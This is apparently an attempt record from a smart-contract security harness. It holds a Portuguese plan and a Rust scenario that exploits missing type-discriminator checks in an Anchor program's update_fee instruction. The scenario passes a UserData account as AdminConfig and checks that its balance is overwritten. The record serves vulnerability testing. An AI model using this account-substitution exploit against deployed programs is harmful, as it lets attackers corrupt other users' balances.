attempts.raw:
{
  "plan": "O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. Vou preparar uma conta AdminConfig legítima com admin = authority e fee = 100, e uma conta UserData com authority = authority (mesmo layout de 8+32+8 bytes). O baseline chama update_fee com a conta AdminConfig e deve ter sucesso. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig: como o discriminador é diferente, o harness aceita como COSPLAY; se o programa não validar o tipo, a instrução terá sucesso e sobrescreverá o campo `balance` da UserData (offset 40..48) com o novo fee, demonstrando o dano.",
  "scenario": "let authority = Pubkey::new_unique();
let admin_config = account(
    &env.program_id,
    &anchor_account_data("AdminConfig", &(authority, 100u64)),
    None,
);
let user_data = account(
    &env.program_id,
    &anchor_account_data("UserData", &(authority, 777u64)),
    None,
);

let metas = vec![
    AccountMeta::new(admin_config_key, false),
    AccountMeta::new_readonly(authority, true),
];

let baseline_ix = env.anchor_ix("update_fee", &(200u64,), metas.clone());
let baseline_accounts = vec![
    (admin_config_key, admin_config.clone()),
    (authority, wallet(1_000_000_000)),
];
let baseline_result = env.baseline("update_fee legitimo com AdminConfig", &baseline_ix, &baseline_accounts);

let attack_metas = vec![
    AccountMeta::new(user_data_key, false),
    AccountMeta::new_readonly(authority, true),
];
let attack_ix = env.anchor_ix("update_fee", &(999u64,), attack_metas);
let attack_accounts = vec![
    (user_data_key, user_data.clone()),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("update_fee com UserData no lugar de AdminConfig", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let after_user = after(&attack_result, &user_data_key);
    env.effect(
        "UserData foi aceita como AdminConfig e seu campo balance foi sobrescrito com o novo fee",
        read_u64(after_user.data(), 40) == 999u64,
    );
}"
}

